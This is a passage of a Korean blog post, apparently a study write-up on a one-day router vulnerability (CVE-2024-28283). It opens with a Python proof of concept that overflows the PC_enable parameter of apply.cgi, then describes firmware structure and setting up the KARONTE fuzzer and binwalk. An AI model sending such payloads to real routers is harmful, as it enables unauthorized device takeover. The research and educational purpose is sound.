&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter target IP: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter session_id: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apply.cgi;session_id=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept-Language&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;en-US,en;q=0.5&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;gzip, deflate&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;application/x-www-form-urlencoded&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Origin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;close&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Referer&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/apply.cgi;session_id=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upgrade-Insecure_Requests&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit_button&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GuestNetworkSetting&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gui_action&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Apply&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;#dummy
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;		&lt;span class=&quot;c1&quot;&gt;#return address
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PC_enable&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;033-취약점-익스플로잇-결과&quot;&gt;0.3.3. 취약점 익스플로잇 결과&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;RCE
    &lt;ul&gt;
      &lt;li&gt;웹 관리자 권한을 획득할 경우, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apply.cgi&lt;/code&gt; 인터페이스에 들어가는 POST 요청에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PC_enable&lt;/code&gt; 파라미터를 삽입함으로써 RCE가 가능해짐&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-실-분석-수행&quot;&gt;1. 실 분석 수행&lt;/h1&gt;

&lt;p&gt;원데이라는 점을 주었고, 취약점 발생 포인트를 주었기 때문에 아마 당 접근 방법이 정석에 가까울 것이다.&lt;/p&gt;

&lt;p&gt;그러나 이전에 배운 점을 제대로 응용해 보고 싶었다.&lt;/p&gt;

&lt;p&gt;따라서 이 과제를 이전 과제와 연계해 더 고도화 수행하는 방법을 고민했다.&lt;/p&gt;

&lt;p&gt;저번주에 논문으로 알려준 KARONTE를 직접 이용해서 문제 바이너리의 취약점을 찾아내고, 정적 및 동적 분석까지 수행 후, 그에 대한 익스플로잇까지 완료하는 시나리오가 좋지 않을까?&lt;/p&gt;

&lt;p&gt;KARONTE 논문의 말미에는 해당 퍼저를 오픈소스로 공개했다는 말도 있으니(In the spirit of open science, we release the implementation of our prototype and a docker image to replicate our working environment.) 실현 가능한 과제 수행 방안이다.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ucsb-seclab/karonte&quot;&gt;https://github.com/ucsb-seclab/karonte&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;시간이 부족해 퍼저에서 결과를 얻는 것이 가능할지 모르겠으나, 최대한 진행해 본다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;10-karonte를-활용한-분석&quot;&gt;1.0. KARONTE를 활용한 분석&lt;/h2&gt;

&lt;h3 id=&quot;100-펌웨어-분석은-어떻게-시작해야-하는가&quot;&gt;1.0.0. 펌웨어 분석은 어떻게 시작해야 하는가?&lt;/h3&gt;

&lt;p&gt;펌웨어에 대해 분석을 해본 적은 없어서, 먼저 KARONTE 논문의 초입을 확인했다.&lt;/p&gt;

&lt;p&gt;‘Firmware Pre-Processing’ 과정에서 자동으로 binwalk 등의 툴로 펌웨어 이미지를 언패킹한다고 되어 있다.&lt;/p&gt;

&lt;p&gt;‘펌웨어 이미지 언패킹’ 이 정확히 어떤 input 파일을 넣어 어떤 output을 얻고, 그 과정에서 어떤 행위를 수행하는 것인지 모른다.&lt;/p&gt;

&lt;p&gt;따라서 ‘firmware image unpack bin’으로 검색했고, 아래와 같은 블로그 글을 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%203.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;출처: &lt;a href=&quot;https://k1rha.tistory.com/entry/%ED%8E%8C%EC%9B%A8%EC%96%B4-%EB%B6%84%EC%84%9D-1%EB%8B%A8%EA%B3%84-bin-%ED%8C%8C%EC%9D%BC-%EA%B9%8C%EA%B8%B0-Firmware-analysis-method-Unpack-Bin-file&quot;&gt;https://k1rha.tistory.com/entry/%ED%8E%8C%EC%9B%A8%EC%96%B4-%EB%B6%84%EC%84%9D-1%EB%8B%A8%EA%B3%84-bin-%ED%8C%8C%EC%9D%BC-%EA%B9%8C%EA%B8%B0-Firmware-analysis-method-Unpack-Bin-file&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;펌웨어 분석을 하기 전 preprocessing이란 bin 확장자로 주어진 파일을 펌웨어 분석 툴을 활용해 unpack 진행할 경우, 파일시스템과 같은 unpacked된 결과물이 떨어지는 것으로 보인다.&lt;/p&gt;

&lt;p&gt;펌웨어는 하드웨어를 구동하기 위해 상당히 low-level에서 동작하도록 설계된 프로그램이다.&lt;/p&gt;

&lt;p&gt;그런 프로그램을 언패킹했을 때 파일시스템의 형태가 떨어진다는 건, 아마 하드웨어 인스트럭션-OS 중간 격의 동작도 겸하기 때문이 아닐까 추측된다. 아마 맞을 것 같다. 컴퓨터에서도 OS 부팅을 위해 CMOS라는 하드웨어 컴포넌트를 따로 두고 그 기반으로 에러커렉션 해서 BIOS가 돌아가니까&lt;/p&gt;

&lt;p&gt;이 추측이 맞는지 여부를 확인하기 위해 firmware architecture등의 키워드로 검색해 보았다.&lt;/p&gt;

&lt;p&gt;그 결과, 펌웨어는 아래와 같은 구조를 가진다고 한다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%204.png&quot; alt=&quot;출처: [https://www.bytesnap.com/news-blog/firmware-explained-guide/](https://www.bytesnap.com/news-blog/firmware-explained-guide/)&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;출처: &lt;a href=&quot;https://www.bytesnap.com/news-blog/firmware-explained-guide/&quot;&gt;https://www.bytesnap.com/news-blog/firmware-explained-guide/&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Bootloader: This immutable code runs first when a device powers on. It initialises core hardware like the CPU and memory, then &lt;strong&gt;loads the main firmware image from storage.&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;OS kernel: The kernel manages system resources and provides core services like multitasking and memory allocation. For small devices, it may be a real-time operating system (RTOS).&lt;/li&gt;
  &lt;li&gt;Device drivers: these enable the &lt;strong&gt;OS to communicate with hardware&lt;/strong&gt; like radios, sensors, and storage. They &lt;strong&gt;abstract&lt;/strong&gt; the hardware complexity into a common interface.&lt;/li&gt;
  &lt;li&gt;Middleware: Middleware provides connectivity, security, protocol stacks, and other &lt;strong&gt;services above the OS&lt;/strong&gt;. For example, a TCP/IP stack for network connectivity.&lt;/li&gt;
  &lt;li&gt;Application code: The main application firmware implements the &lt;strong&gt;device’s end-user functionality&lt;/strong&gt; – for example, user interfaces, algorithms, and network protocols.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;또한, 아래와 같은 특징을 가지고 있다 한다.(출처: &lt;a href=&quot;https://stackoverflow.com/questions/40853918/what-are-common-structures-for-firmware-files&quot;&gt;https://stackoverflow.com/questions/40853918/what-are-common-structures-for-firmware-files&lt;/a&gt; , chatgpt를 활용해 요약)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;✏️5-Bullet Summary:&lt;/strong&gt;&lt;/p&gt;

&lt;ol class=&quot;notice&quot;&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Firmware File Composition:&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;Firmware is stored as an Executable and Linkable File (ELF), &lt;strong&gt;often converted to binary (.bin)&lt;/strong&gt; or text-based binary (.hex), and represents the exact memory content written to the embedded flash.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Startup Process:&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;On powering the board, the internal &lt;strong&gt;bootloader&lt;/strong&gt; redirects execution to the firmware’s entry point (usually at address 0x0). Startup code initializes the system (e.g., setting the clock, stack pointer, vector table, and memory sections).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Embedded vs. OS Control:&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;Unlike operating systems, where user code relies on APIs and system libraries for low-level operations, &lt;strong&gt;embedded systems give full hardware and resource management control to user code.&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Firmware and OS Similarities:&lt;/strong&gt;&lt;/p&gt;

    &lt;p&gt;Both firmware and operating systems handle processors, memory, and I/O similarly, organizing code and data sections in memory during initialization.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Key Differences:&lt;/strong&gt;&lt;/p&gt;
    &lt;ul&gt;
      &lt;li&gt;Firmware uses &lt;strong&gt;physical RAM addressing&lt;/strong&gt; due to limited memory mapping in most microcontrollers.&lt;/li&gt;
      &lt;li&gt;&lt;strong&gt;Stack memory in firmware is explicitly managed by user code&lt;/strong&gt; via linker scripts, unlike OS-managed stacks in traditional programs.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;마지막으로, 펌웨어는 크게 3개 종류로 분류된다고 한다.(출처: &lt;a href=&quot;https://www.spiceworks.com/tech/devops/articles/what-is-firmware/&quot;&gt;https://www.spiceworks.com/tech/devops/articles/what-is-firmware/&lt;/a&gt;)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Low-level firmware&lt;/strong&gt;: These cannot be modified or altered since they are considered as integral hardware elements. They are stored on nonvolatile memory chips such as ROM and programmable ROM (PROM).&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;High-level firmware&lt;/strong&gt;: These forms of firmware often have higher levels of instruction complexity than low-level firmware, bringing them closer to the realm of software than hardware. They are used in conjunction with flash memory chips to make upgrades possible.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Subsystem&lt;/strong&gt;: They are parts of a more extensive system that can work independently. It often looks like its device because the microcode for this firmware level is built into the central processing unit (CPU), the liquid crystal display units (LCD), and the flash chips. Also, it is like high-level firmware in terms of operation.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;101-karonte-input-파인&quot;&gt;1.0.1. KARONTE input 파인&lt;/h3&gt;

&lt;p&gt;그런데, KARONTE에서는 binwalk등을 적용해 자동으로 펌웨어를 추출한다고 한다.&lt;/p&gt;

&lt;p&gt;즉 내가 문제로 받은 bin 파일을 그대로 input으로 주어도 될 것 같은데, 이게 맞는지 확실치 않다.&lt;/p&gt;

&lt;p&gt;따라서 이를 확실히 하기 위해 KARONTE의 레포를 확인했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%205.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;되게 json_config_file을 보면 내가 넣어야 할 input 파일의 형태가 가늠될 것 같다.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;pickle_parsers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./pickles/parser/NETGEAR/NETGEAR_analyzed_R6200v2-V10312_10111_fw__R6200v2-V10312_10111chkextracted_squashfs-root.pk&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;stats&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;False&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;data_keys&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;base_addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;eg_source_addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;fw_path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./firmware/NETGEAR/analyzed/R6200v2-V1.0.3.12_10.1.11/fw/_R6200v2-V1.0.3.12_10.1.11.chk.extracted/squashfs-root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;angr_explode_bins&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;openvpn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wpa_supplicant&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vpn&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ip&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;qemu-arm-static&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;var_ord&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;glob_var&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;arch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;only_string&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;False&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 내용을 확실히 이해하려면 레포의 key 별 설명(&lt;a href=&quot;https://github.com/ucsb-seclab/karonte/tree/master/config&quot;&gt;https://github.com/ucsb-seclab/karonte/tree/master/config&lt;/a&gt;) 을 읽으면 되는데, 사실 보면 무엇을 참조해 분석하는지 직관적으로 알 수 있으므로 자세한 설명은 하지 않는다.&lt;/p&gt;

&lt;p&gt;내가 실행중인 docker 컨테이너에는 firmware 디렉토리에 firmware dataset이 있는데, 위 json이 참조하는 분석 대상에 저장된 dataset은 이미 unpack이 되어 있는 형태다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%206.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;나보고 unpack해서 넣어놓으라는 소리 같다.&lt;/p&gt;

&lt;p&gt;binwalk로 직접 unpack을 해보고 그 결과물과 비교해보자.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;102-unpack&quot;&gt;1.0.2. unpack&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;gt;docker cp ./FW_E1000_2.1.03.005_US_20140321.bin karonte:/&lt;/code&gt;  명령어로 대상 펌웨어를 컨테이너로 전송했다.&lt;/p&gt;

&lt;p&gt;그리고 아래와 같이 binwalk를 활용해 unpack했다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image%207.png&quot; alt=&quot;/assets/img/posts/2025-01-27-CVE-2024-28283/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그러나 아래와 같은 에러가 발생했다.&lt;/p&gt;

